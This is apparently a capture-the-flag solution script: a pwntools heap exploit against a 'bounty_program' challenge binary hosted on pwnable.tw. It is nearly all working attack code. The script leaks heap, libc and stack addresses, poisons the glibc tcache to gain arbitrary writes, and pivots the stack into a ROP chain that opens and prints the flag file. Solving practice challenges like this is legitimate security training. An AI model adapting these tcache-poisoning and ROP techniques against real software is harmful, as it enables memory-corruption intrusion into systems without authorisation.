#!/usr/bin/env python3

from pwn import *
import os
import resource

def set_limits():
    resource.setrlimit(resource.RLIMIT_AS, (1 * 1024 * 1024 * 1024, 1 * 1024 * 1024 * 1024))

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda l, c: c * l
z = lambda l: l * b'\0'
A = lambda l: l * b'A'

e = context.binary = ELF('./bounty_program_patched', checksec=False)
libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

TERMINAL = 3
USE_PTY = True
GDB_ATTACH_DELAY = 1

match TERMINAL:
    case 1:
        context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
    case 2:
        context.terminal = ["tmux", "split-window", "-h"]
    case 3:
        context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe",
                            "-w", "0", "split-pane", "-V", "-s", "0.5",
                            "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
    case _:
        raise ValueError(f"Unknown terminal: {TERMINAL}")
        
gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
# brva 0x1601
# brva 0x15E9
# brva 0x20B7
# brva 0x1434
# brva 0x1355
# brva 0x1652
# brva 0x1555
# brva 0x1B4A
brva 0x1434
# brva 0x1601
# brva 0x183D
continue
'''

def attach(p):
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        sleep(GDB_ATTACH_DELAY)

def conn():
    if args.LOCAL:
        env = os.environ.copy()
        # env["GLIBC_TUNABLES"] = "glibc.malloc.tcache_count=0"
        if USE_PTY:
            p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY, env=env, preexec_fn=set_limits)
        else:
            p = process([e.path], env=env, preexec_fn=set_limits)
        sleep(0.025)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10410
        return remote(host, port)

class TcachePerthread:
    MALLOC_ALIGNMENT = 0x10
    MINSIZE = 0x20

    def __init__(self):
        self.num_slots = [0] * 64
        self.entries = [0] * 64

    @staticmethod
    def size2idx(size):
        return (size - TcachePerthread.MINSIZE) // TcachePerthread.MALLOC_ALIGNMENT

    def set_count(self, size, count):
        self.num_slots[self.size2idx(size)] = count
        return self

    def set_entry(self, size, ptr):
        self.entries[self.size2idx(size)] = ptr
        return self

    def pack(self):
        data = b''
        for count in self.num_slots:
            data += p8(count)
        for entry in self.entries:
            data += p64(entry)
        return data
    
def Login(username, password):
    slan(p, b'choice', 1)
    sa(p, b'Username', username)
    sa(p, b'Password', password)
    sleep(0.05)
    
def Register(username, password, contact):
    slan(p, b'choice', 2)
    sa(p, b'Username', username)
    sa(p, b'Password', password)
    sa(p, b'Contact', contact)
    sleep(0.05)

def AddNewProduct(name, company, comment):
    slan(p, b'choice', 1)
    sa(p, b'Name', name)
    sa(p, b'Company', company)
    sa(p, b'Comment', comment)
    sleep(0.05)

def AddVulnType(size, type, price):
    slan(p, b'choice', 2)
    slan(p, b'Size', size)
    sa(p, b'Type', type)
    if price != -1:
        slan(p, b'Price', price)
    sleep(0.05)

def SubmitBugReport(product_id, type_id, title, bug_id, desc_len, description):
    slan(p, b'choice', 3)
    slan(p, b'Product', product_id)
    slan(p, b'Type:', type_id)
    sa(p, b'Title', title)
    slan(p, b'ID', bug_id)
    slan(p, b'Length', desc_len)
    sa(p, b'Descripton', description)
    sleep(0.05)

def RemoveVulnType(size, type):
    slan(p, b'choice', 4)
    slan(p, b'Size', size)
    sa(p, b'Type', type)
    sleep(0.05)

def ShowBugDetail(product_id):
    slan(p, b'choice', 6)
    slan(p, b'ID', product_id)
    sleep(0.05)

def DeleteReport(product_id, bug_id):
    slan(p, b'choice', 8)
    slan(p, b'Product ID', product_id)
    slan(p, b'Bug ID', bug_id)

username = password = b'ngtuonghung'
ub_size = 0x420
tcache_size = 0x240

attempt = 0
while True:
    attempt += 1
    print("\n----------> Attempt", attempt)
    
    p = conn()

    if not args.LOCAL:
        sa(p, b'Name', username)
        slan(p, b'Value', password)

    print("Register and login")
    Register(username, password, b'A')
    Login(username, password)

    # Bounty
    slan(p, b'choice', 1)

    print("Leaking heap address")
    AddVulnType(tcache_size, b'A', 0)
    AddVulnType(tcache_size, b'B', 0) # This only works since calloc skip tcache
    slan(p, b'choice', 2)
    slan(p, b'Size', -1)
    sa(p, b'Type', b'0')
    ru(p, b'type: ')
    heap_base = leak_bytes(b'\0' + rn(p, 5), 0x500)
    lg("heap base", heap_base)

    # Hoping for heap base address ends with 0x0000
    if heap_base & 0xffff != 0:
        print("Failed attempt, we're unlucky this time")
        p.close()
        continue
    
    print("We're lucky this time")

    print("Leaking libc address")
    AddVulnType(ub_size, b'C', 0)
    slan(p, b'choice', 2)
    slan(p, b'Size', -1)
    sa(p, b'Type', b'0')
    ru(p, b'type: ')
    libc.address = leak_bytes(b'\0' + rn(p, 5), 0x3ec000)
    lg("libc base", libc.address)

    # Clear types to create more
    RemoveVulnType(ub_size, b'XSS')
    RemoveVulnType(ub_size, b'DoS')
    RemoveVulnType(ub_size, b'A')
    RemoveVulnType(ub_size, b'B')
    RemoveVulnType(ub_size, b'C')

    AddNewProduct(b'iphone 18 pro max vip premium', b'4pple', b'A')
    SubmitBugReport(0, 0, b'A', 0, 0x2000-0x130, b'A')

    # Clear unsortedbin
    AddVulnType(ub_size, A(0x210-1), 0)

    # Allocatae chunk ends with 0x2c10 and free it to tcache bin 0x250
    RemoveVulnType(tcache_size, b'A')

    # Overwrite 0x2c with null, works since calloc() skip tcache
    AddVulnType(0x240, b'\0', -1)
    slan(p, b'choice', 2)
    slan(p, b'Size', -1)
    sa(p, b'Type', b'\0')
    slan(p, b'Price', 0)

    # Remove type to create more
    RemoveVulnType(ub_size, A(0x210-1))

    # Take 1 chunk from tcache 0x250 using strdup()
    AddVulnType(ub_size, A(tcache_size - 1), 0)
    # Allocate at 0x0010 using strdup()
    AddVulnType(ub_size, b'B' * (tcache_size - 1), 0)
    # Free to put in unsortedbin for later calloc()
    RemoveVulnType(ub_size, b'B' * (tcache_size - 1))

    # Remove types to create more
    RemoveVulnType(ub_size, b'RCE')
    RemoveVulnType(ub_size, A(tcache_size - 1))

    # Control tcache
    tcache = TcachePerthread()
    tcache.set_count(tcache_size + 0x10, 0)
    # Overwrite bug description pointer to environ to leak stack
    desc = heap_base + 0xce8
    tcache.set_entry(0x20, desc)

    AddVulnType(tcache_size, tcache.pack()[:tcache_size - 1], -1)

    print("Leaking stack address")
    environ = libc.symbols['__environ']
    lg("environ", environ)
    AddVulnType(ub_size, flat(A(0x10), environ), 0)

    ShowBugDetail(0)

    ru(p, b'Descripton > ')
    stack = leak_bytes(rn(p, 6))
    lg("stack", stack)

    # Control entire tcache again using the same trick above
    AddVulnType(ub_size, b'B' * (tcache_size - 1), 0)
    RemoveVulnType(ub_size, b'B' * (tcache_size - 1))

    tcache = TcachePerthread()
    # Prevent freeing to unsortedbin to avoid corruption
    tcache.set_count(0x250, 0)
    # To write pop rsp into return address of Bounty()
    tcache.set_entry(0x30, stack - 0x128)
    # To write rsp value after pop rsp
    tcache.set_entry(0x20, stack - 0x108)
    AddVulnType(0x240, tcache.pack()[:tcache_size - 1], -1)

    pop_rax = libc.address + 0x00000000000439c8
    pop_rdi = libc.address + 0x000000000002155f
    pop_rsi = libc.address + 0x0000000000023e6a
    pop_rdx = libc.address + 0x0000000000001b96
    pop_rsp = libc.address + 0x000000000011bd7c
    syscall = libc.address + 0x00000000000d2975
    
    ROP_chain_addr = heap_base + 0x3260
    flag_path = ROP_chain_addr + 0xd8
    flag_buf = flag_path + 0x20

    ROP_chain = flat(
        # open("/home/bounty_program/flag", 0, 0)
        pop_rdi, flag_path,
        pop_rsi, 0,
        pop_rdx, 0,
        pop_rax, 2,
        syscall,

        # read(4, buf, 0x100)
        pop_rdi, 4, # 3 is /dev/urandom
        pop_rsi, flag_buf,
        pop_rdx, 0x100,
        pop_rax, 0,
        syscall,

        # write(1, buf, 0x100)
        pop_rdi, 1,
        pop_rsi, flag_buf,
        pop_rdx, 0x100,
        pop_rax, 1,
        syscall,

        b'/home/bounty_program/flag\0'
    )
    # Write ROP chain onto heap
    SubmitBugReport(0, 0, b'A', 0, 0x100, ROP_chain)

    attach(p)
    sleep(0.5)

    # Stack pivot to heap to execute ROP chain
    AddVulnType(ub_size, p64(ROP_chain_addr),0)
    AddVulnType(ub_size, flat(A(0x18), pop_rsp),0)

    # Capture the flag
    slan(p, b'Your choice', 0)

    print(f'Flag: {ra(p, 2)}')
    p.close()
    break